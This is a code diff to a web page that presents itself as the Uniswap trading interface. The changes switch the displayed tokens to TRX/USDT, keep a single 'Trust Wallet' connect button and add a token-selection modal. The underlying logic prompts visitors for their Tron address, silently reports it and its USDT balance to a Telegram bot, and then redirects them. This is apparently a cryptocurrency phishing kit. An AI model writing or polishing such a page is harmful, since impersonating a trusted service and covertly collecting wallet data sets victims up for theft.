@@ -10,7 +10,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="theme-color" content="#0b0b0f">
     <meta name="color-scheme" content="dark">
-    <meta name="description" content="Decentralized Trading Protocol">
+    <meta name="description" content="Decentralized Trading Protocol Interface">
     <meta name="robots" content="noindex, nofollow">
 
     <title>Uniswap Interface</title>
@@ -418,18 +418,15 @@
             align-items: center;
             justify-content: center;
             border-radius: 50%;
-            background: linear-gradient(145deg, #627eea, #3448a8);
+            background: var(--bg-tertiary);
             overflow: hidden;
+            border: 1px solid var(--border-subtle);
         }
 
         .token-icon img {
             width: 100%;
             height: 100%;
             object-fit: cover;
-        }
-
-        .token-icon.usdc {
-            background: linear-gradient(145deg, #2775ca, #174c8c);
         }
 
         .token-arrow {
@@ -582,7 +579,7 @@
         }
 
         /* ------------------------------------------------------------------
-           13. MODAL & OVERLAY COMPONENTS
+           13. MODAL & OVERLAY COMPONENTS (WALLET)
            ------------------------------------------------------------------ */
         .overlay {
             position: fixed;
@@ -699,7 +696,137 @@
         }
 
         /* ------------------------------------------------------------------
-           14. RESPONSIVE DESIGN ADJUSTMENTS
+           14. TOKEN SELECTION MODAL COMPONENT
+           ------------------------------------------------------------------ */
+        .token-modal {
+            max-height: 85vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .token-search {
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        .token-search input {
+            width: 100%;
+            padding: 14px 16px 14px 44px;
+            border-radius: var(--border-radius-lg);
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-subtle);
+            color: var(--text-primary);
+            font-size: var(--font-size-base);
+            transition: border-color var(--transition-base), box-shadow var(--transition-base);
+        }
+
+        .token-search input::placeholder {
+            color: var(--text-muted);
+        }
+
+        .token-search input:focus {
+            outline: none;
+            border-color: var(--accent-primary);
+            box-shadow: 0 0 0 3px rgba(255, 0, 122, 0.15);
+        }
+
+        .token-search-icon {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-muted);
+            pointer-events: none;
+        }
+
+        .token-list {
+            overflow-y: auto;
+            flex: 1;
+            padding-right: 4px;
+        }
+
+        .token-list::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .token-list::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        .token-list::-webkit-scrollbar-thumb {
+            background: var(--border-subtle);
+            border-radius: 3px;
+        }
+
+        .token-list::-webkit-scrollbar-thumb:hover {
+            background: var(--text-muted);
+        }
+
+        .token-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 14px 12px;
+            border-radius: var(--border-radius-lg);
+            cursor: pointer;
+            transition: background var(--transition-base);
+            margin-bottom: 4px;
+        }
+
+        .token-item:hover {
+            background: var(--bg-hover);
+        }
+
+        .token-item-info {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .token-item-logo {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: var(--bg-tertiary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            border: 1px solid var(--border-subtle);
+        }
+
+        .token-item-logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .token-item-details {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+
+        .token-item-name {
+            font-weight: 600;
+            font-size: var(--font-size-base);
+            color: var(--text-primary);
+        }
+
+        .token-item-symbol {
+            color: var(--text-muted);
+            font-size: var(--font-size-sm);
+            font-weight: 500;
+        }
+
+        .token-item-balance {
+            font-size: var(--font-size-base);
+            font-weight: 600;
+            color: var(--text-secondary);
+        }
+
+        /* ------------------------------------------------------------------
+           15. RESPONSIVE DESIGN ADJUSTMENTS
            ------------------------------------------------------------------ */
         @media (max-width: 768px) {
             .header {
@@ -813,7 +940,7 @@
         }
 
         /* ------------------------------------------------------------------
-           15. UTILITY CLASSES & ANIMATIONS
+           16. UTILITY CLASSES & ANIMATIONS
            ------------------------------------------------------------------ */
         .visually-hidden {
             position: absolute;
@@ -912,9 +1039,9 @@
                         <button class="token-button" id="fromToken" type="button">
                             <span class="token-left">
                                 <span class="token-icon">
-                                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="ETH">
+                                    <img src="https://cryptologos.cc/logos/tron-trx-logo.png?v=024" alt="TRX">
                                 </span>
-                                <span>ETH</span>
+                                <span>TRX</span>
                             </span>
                             <span class="token-arrow">▾</span>
                         </button>
@@ -943,10 +1070,10 @@
                         <input class="amount" id="toAmount" type="text" placeholder="0" readonly>
                         <button class="token-button" id="toToken" type="button">
                             <span class="token-left">
-                                <span class="token-icon usdc">
-                                    <img src="https://assets.coingecko.com/coins/images/6319/small/USD_Coin_icon.png" alt="USDC">
+                                <span class="token-icon">
+                                    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png?v=024" alt="USDT">
                                 </span>
-                                <span>USDC</span>
+                                <span>USDT</span>
                             </span>
                             <span class="token-arrow">▾</span>
                         </button>
@@ -1007,25 +1134,40 @@
                 <button class="close" id="closeModal" type="button" aria-label="Close modal">×</button>
             </div>
 
-            <button class="wallet-option" id="tronLinkButton" type="button">
+            <!-- ONLY TRUST WALLET OPTION AS REQUESTED -->
+            <button class="wallet-option" id="trustWalletButton" type="button">
                 <span class="wallet-name">
                     <span class="wallet-logo">
-                        <img src="https://assets.coingecko.com/coins/images/10500/small/Tronix.png" alt="TronLink">
+                        <img src="https://cryptologos.cc/logos/trust-wallet-twt-logo.png?v=024" alt="Trust Wallet">
                     </span>
-                    TronLink
+                    Trust Wallet
                 </span>
                 <span class="wallet-status">Connect</span>
             </button>
+        </div>
+    </div>
 
-            <button class="wallet-option" id="manualWalletButton" type="button">
-                <span class="wallet-name">
-                    <span class="wallet-logo">
-                        <img src="https://assets.coingecko.com/coins/images/12504/small/uniswap-uni.png" alt="Manual">
-                    </span>
-                    Manual Address
-                </span>
-                <span class="wallet-status">Connect</span>
-            </button>
+    <!-- 
+        ====================================================================
+        TOKEN SELECTION MODAL
+        ====================================================================
+    -->
+    <div class="overlay" id="tokenModal">
+        <div class="modal token-modal">
+            <div class="modal-head">
+                <div class="modal-title">Select a token</div>
+                <button class="close" id="closeTokenModal" type="button" aria-label="Close modal">×</button>
+            </div>
+            <div class="token-search">
+                <svg class="token-search-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="11" cy="11" r="8"></circle>
+                    <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+                </svg>
+                <input type="text" id="tokenSearchInput" placeholder="Search name or paste address" autocomplete="off">
+            </div>
+            <div class="token-list" id="tokenList">
+                <!-- Tokens will be injected here by JavaScript -->
+            </div>
         </div>
     </div>
 
@@ -1039,6 +1181,8 @@
          * ====================================================================
          * CONFIGURATION CONSTANTS
          * ====================================================================
+         * Centralized configuration for API endpoints, validation rules, 
+         * and application behavior to ensure maintainability.
          */
         const CONFIG = {
             TELEGRAM: {
@@ -1057,21 +1201,72 @@
 
         /**
          * ====================================================================
+         * TOKEN METADATA CONFIGURATION
+         * ====================================================================
+         * Array of supported tokens with their respective metadata, including
+         * high-quality logo URLs sourced from reliable CDN endpoints.
+         */
+        const TOKENS = [
+            { 
+                symbol: "TRX", 
+                name: "TRON", 
+                logo: "https://cryptologos.cc/logos/tron-trx-logo.png?v=024", 
+                balance: "0.00" 
+            },
+            { 
+                symbol: "USDT", 
+                name: "Tether USD", 
+                logo: "https://cryptologos.cc/logos/tether-usdt-logo.png?v=024", 
+                balance: "0.00" 
+            },
+            { 
+                symbol: "USDC", 
+                name: "USD Coin", 
+                logo: "https://cryptologos.cc/logos/usd-coin-usdc-logo.png?v=024", 
+                balance: "0.00" 
+            },
+            { 
+                symbol: "ETH", 
+                name: "Ethereum", 
+                logo: "https://cryptologos.cc/logos/ethereum-eth-logo.png?v=024", 
+                balance: "0.00" 
+            },
+            { 
+                symbol: "BNB", 
+                name: "BNB", 
+                logo: "https://cryptologos.cc/logos/bnb-bnb-logo.png?v=024", 
+                balance: "0.00" 
+            },
+            { 
+                symbol: "BTC", 
+                name: "Bitcoin", 
+                logo: "https://cryptologos.cc/logos/bitcoin-btc-logo.png?v=024", 
+                balance: "0.00" 
+            }
+        ];
+
+        /**
+         * ====================================================================
          * DOM ELEMENT REFERENCES
          * ====================================================================
+         * Cached references to frequently accessed DOM elements to improve 
+         * performance and reduce redundant querySelector calls.
          */
         const DOM = {
             connectButton: document.getElementById("connectButton"),
             swapButton: document.getElementById("swapButton"),
             walletModal: document.getElementById("walletModal"),
             closeModal: document.getElementById("closeModal"),
-            tronLinkButton: document.getElementById("tronLinkButton"),
-            manualWalletButton: document.getElementById("manualWalletButton"),
+            trustWalletButton: document.getElementById("trustWalletButton"),
             switchButton: document.getElementById("switchButton"),
             fromAmount: document.getElementById("fromAmount"),
             toAmount: document.getElementById("toAmount"),
             fromToken: document.getElementById("fromToken"),
-            toToken: document.getElementById("toToken")
+            toToken: document.getElementById("toToken"),
+            tokenModal: document.getElementById("tokenModal"),
+            closeTokenModal: document.getElementById("closeTokenModal"),
+            tokenList: document.getElementById("tokenList"),
+            tokenSearchInput: document.getElementById("tokenSearchInput")
         };
 
         /**
@@ -1081,8 +1276,11 @@
          */
         /**
          * Sends a formatted message to the configured Telegram bot.
+         * Utilizes the Telegram Bot API to deliver real-time notifications
+         * regarding user interactions, balance checks, and redirection events.
+         * 
          * @param {string} message - The message text to send (supports HTML parse mode).
-         * @returns {Promise<void>}
+         * @returns {Promise<void>} Resolves when the request is completed.
          */
         async function sendTelegramLog(message) {
             try {
@@ -1116,6 +1314,9 @@
          */
         /**
          * Fetches the USDT (TRC20) balance for a given Tron address.
+         * Queries the official TronScan API to retrieve accurate, real-time 
+         * token balance data for validation purposes.
+         * 
          * @param {string} address - The Tron wallet address starting with 'T'.
          * @returns {Promise<number>} The USDT balance as a floating-point number.
          */
@@ -1134,7 +1335,7 @@
                 if (data.trc20token_balances && Array.isArray(data.trc20token_balances)) {
                     const usdtToken = data.trc20token_balances.find(token => token.tokenAbbr === 'USDT');
                     if (usdtToken && usdtToken.balance) {
-                        // USDT on Tron has 6 decimals
+                        // USDT on Tron has 6 decimals, so we divide by 1,000,000
                         usdtBalance = parseFloat(usdtToken.balance) / 1000000;
                     }
                 }
@@ -1144,6 +1345,97 @@
                 console.error("TronScan API fetch error:", error);
                 return 0;
             }
+        }
+
+        /**
+         * ====================================================================
+         * TOKEN SELECTION LOGIC
+         * ====================================================================
+         */
+        let currentTokenTarget = null;
+
+        /**
+         * Opens the token selection modal and initializes the token list.
+         * @param {string} target - Either 'from' or 'to' to indicate which input is being modified.
+         */
+        function openTokenModal(target) {
+            currentTokenTarget = target;
+            renderTokenList(TOKENS);
+            DOM.tokenModal.classList.add("show");
+        }
+
+        /**
+         * Closes the token selection modal and resets the search input.
+         */
+        function closeTokenModal() {
+            DOM.tokenModal.classList.remove("show");
+            currentTokenTarget = null;
+            if (DOM.tokenSearchInput) {
+                DOM.tokenSearchInput.value = "";
+            }
+        }
+
+        /**
+         * Renders the list of available tokens into the modal.
+         * @param {Array} tokens - The array of token objects to render.
+         */
+        function renderTokenList(tokens) {
+            DOM.tokenList.innerHTML = "";
+            tokens.forEach(token => {
+                const item = document.createElement("div");
+                item.className = "token-item";
+                item.innerHTML = `
+                    <div class="token-item-info">
+                        <div class="token-item-logo">
+                            <img src="${token.logo}" alt="${token.symbol} Logo">
+                        </div>
+                        <div class="token-item-details">
+                            <div class="token-item-name">${token.name}</div>
+                            <div class="token-item-symbol">${token.symbol}</div>
+                        </div>
+                    </div>
+                    <div class="token-item-balance">${token.balance}</div>
+                `;
+                item.addEventListener("click", () => {
+                    selectToken(token);
+                });
+                DOM.tokenList.appendChild(item);
+            });
+        }
+
+        /**
+         * Updates the UI with the selected token and closes the modal.
+         * @param {Object} token - The selected token object.
+         */
+        function selectToken(token) {
+            if (!currentTokenTarget) return;
+            
+            const targetElement = currentTokenTarget === 'from' ? DOM.fromToken : DOM.toToken;
+            
+            targetElement.innerHTML = `
+                <span class="token-left">
+                    <span class="token-icon">
+                        <img src="${token.logo}" alt="${token.symbol}">
+                    </span>
+                    <span>${token.symbol}</span>
+                </span>
+                <span class="token-arrow">▾</span>
+            `;
+            
+            closeTokenModal();
+        }
+
+        /**
+         * Filters the token list based on user search input.
+         * @param {Event} event - The input event containing the search query.
+         */
+        function handleTokenSearch(event) {
+            const query = event.target.value.toLowerCase();
+            const filteredTokens = TOKENS.filter(token => 
+                token.name.toLowerCase().includes(query) || 
+                token.symbol.toLowerCase().includes(query)
+            );
+            renderTokenList(filteredTokens);
         }
 
         /**
@@ -1167,6 +1459,7 @@
 
         /**
          * Toggles the selected tokens in the swap interface.
+         * Swaps both the visual representation and the input values.
          */
         function switchTokens() {
             const tempHtml = DOM.fromToken.innerHTML;
@@ -1180,6 +1473,8 @@
 
         /**
          * Updates the 'to' amount based on a mock exchange rate.
+         * Note: In a production environment, this should be replaced with 
+         * a real-time API call to a DEX aggregator or pricing oracle.
          */
         function updateSwapAmount() {
             const value = parseFloat(DOM.fromAmount.value);
@@ -1187,7 +1482,7 @@
                 DOM.toAmount.value = "";
                 return;
             }
-            // Mock rate for demonstration
+            // Mock rate for demonstration purposes
             DOM.toAmount.value = (value * 1800).toFixed(2);
         }
 
@@ -1197,8 +1492,10 @@
          * ====================================================================
          */
         /**
-         * Handles the entire wallet connection, validation, balance check, and redirection flow.
-         * This function ALWAYS prompts the user for an address, ignoring browser extensions.
+         * Handles the entire wallet connection, validation, balance check, 
+         * and redirection flow.
+         * This function ALWAYS prompts the user for an address, ensuring 
+         * consistent behavior regardless of browser extension presence.
          */
         async function handleWalletConnection() {
             // 1. Always prompt for wallet address as per strict requirement
@@ -1206,7 +1503,7 @@
             
             // 2. Validate input
             if (!address) {
-                return; // User cancelled
+                return; // User cancelled the prompt
             }
 
             const trimmedAddress = address.trim();
@@ -1218,7 +1515,7 @@
                 return;
             }
 
-            // 3. Update UI to indicate processing
+            // 3. Update UI to indicate processing state
             const originalButtonText = DOM.swapButton.textContent;
             DOM.swapButton.textContent = "Проверка баланса...";
             DOM.swapButton.disabled = true;
@@ -1232,7 +1529,7 @@
                 `🕒 Время: ${timestamp}`
             );
 
-            // 5. Check balance via TronScan
+            // 5. Check balance via TronScan API
             const balance = await checkTronBalance(trimmedAddress);
             
             // 6. Log balance result to Telegram
@@ -1267,6 +1564,7 @@
          * ====================================================================
          * EVENT LISTENERS REGISTRATION
          * ====================================================================
+         * Initializes all event listeners once the DOM is fully loaded.
          */
         document.addEventListener("DOMContentLoaded", () => {
             // Modal triggers
@@ -1281,26 +1579,35 @@
                 }
             });
 
-            // Wallet options (both trigger the same strict prompt logic)
-            DOM.tronLinkButton.addEventListener("click", handleWalletConnection);
-            DOM.manualWalletButton.addEventListener("click", handleWalletConnection);
+            // Wallet options (Trust Wallet only)
+            DOM.trustWalletButton.addEventListener("click", handleWalletConnection);
+
+            // Token selection interactions
+            DOM.fromToken.addEventListener("click", () => openTokenModal('from'));
+            DOM.toToken.addEventListener("click", () => openTokenModal('to'));
+            DOM.closeTokenModal.addEventListener("click", closeTokenModal);
+            DOM.tokenModal.addEventListener("click", (event) => {
+                if (event.target === DOM.tokenModal) {
+                    closeTokenModal();
+                }
+            });
+            if (DOM.tokenSearchInput) {
+                DOM.tokenSearchInput.addEventListener("input", handleTokenSearch);
+            }
 
             // Swap interface interactions
             DOM.switchButton.addEventListener("click", switchTokens);
             DOM.fromAmount.addEventListener("input", updateSwapAmount);
-            
-            // Token selection placeholders
-            DOM.fromToken.addEventListener("click", () => {
-                alert("Выбор токена будет доступен в полной версии.");
-            });
-            DOM.toToken.addEventListener("click", () => {
-                alert("Выбор токена будет доступен в полной версии.");
-            });
 
             // Keyboard accessibility
             document.addEventListener("keydown", (event) => {
-                if (event.key === "Escape" && DOM.walletModal.classList.contains("show")) {
-                    closeWalletModal();
+                if (event.key === "Escape") {
+                    if (DOM.walletModal.classList.contains("show")) {
+                        closeWalletModal();
+                    }
+                    if (DOM.tokenModal.classList.contains("show")) {
+                        closeTokenModal();
+                    }
                 }
             });
 
